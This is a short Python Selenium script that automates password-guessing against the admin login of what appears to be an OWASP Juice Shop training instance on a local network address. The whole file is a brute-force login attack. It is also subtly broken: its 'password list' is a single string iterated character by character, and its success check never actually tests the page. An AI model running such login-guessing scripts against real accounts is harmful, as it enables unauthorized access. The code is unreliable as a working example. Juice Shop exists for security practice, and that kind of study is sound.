from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support import expected_conditions as ec
from selenium.webdriver.support.wait import WebDriverWait

# go to log in webpage
driver = webdriver.Edge()
driver.get("http://192.168.6.25:3000/#/login")

# retrieve username location
username = driver.find_element(By.XPATH, "/html/body/app-root/div/mat-sidenav-container/mat-sidenav-content/app-login/div/mat-card/div/mat-form-field[1]/div/div[1]/div[3]/input")

# retrieve password location
password = driver.find_element(By.XPATH, "/html/body/app-root/div/mat-sidenav-container/mat-sidenav-content/app-login/div/mat-card/div/mat-form-field[2]/div/div[1]/div[3]/input")

# retrieve button location
button = driver.find_element(By.XPATH, "/html/body/app-root/div/mat-sidenav-container/mat-sidenav-content/app-login/div/mat-card/div/button")

# retrieve list of passwords (the last password is my real password
answer_list = ("hello")

y = ""
# loop through password options
for x in answer_list:
    y = x
    username.send_keys("admin@juice-sh.op")
    password.send_keys(x)
    driver.execute_script("arguments[0].click();", button)
    if ec.presence_of_element_located("/html/body/app-root/div/mat-sidenav-container/mat-sidenav-content/app-login/div/mat-card/div/mat-form-field[1]/div/div[1]/div[3]/input"):
        username.clear()
        password.clear()
    else:
        break

print(y)

# tell driver to wait until webpage gives an alert (it never will), this is so progress can be observed
WebDriverWait(driver, 200).until(ec.alert_is_present(), "done")

# hi